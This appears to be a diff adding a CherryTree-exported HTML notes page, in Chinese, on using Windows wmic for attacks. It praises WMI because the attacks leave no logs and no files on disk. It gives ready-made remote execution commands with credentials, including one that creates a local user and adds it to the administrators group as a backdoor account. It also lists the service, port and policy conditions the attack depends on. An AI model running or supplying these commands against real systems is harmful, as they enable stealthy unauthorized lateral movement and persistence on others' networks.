@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>wmic</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>wmic</h1><br/>wmic<br />WMI 的全称是 Windows Management Instrumentation,它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统,攻击者使用 wmi 来进行攻击,但 Windows 系统默认不会在日志中记录这些操作,可以做到无日志,攻击脚本无需写入到磁盘,增加了隐蔽性。推荐使用 wmic 进行远程执行命令。<br /><br />常用命令<br />在远程系统上执行 bat 脚本<br />wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\programdata\test.bat<br /><br />在远程系统上执行单条命令<br />wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add<br /><br />不输入 /user和/password表示使用当前身份<br /><br />原理：<br />1、也是DCOM的一种<br />2、调用的是RemoteCreateInstance方法<br />3、wmic的DCOM UUID：8BC3F05E-D86B-11D0-A075-00C04FB68820<br /><br /><br />工具说明<br />1. 需要远程系统启动 Windows Management Instrumentation 服务，开放135端口<br />2. 远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”<br />3. wmic 会以管理员权限在远程系统上执行命令<br />4. 防火墙开启将无法连接<br />5. 如果报错 &quot;Invalid Global Switch&quot; ，用双引号把包含-的结点括起来即可正常执行。<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
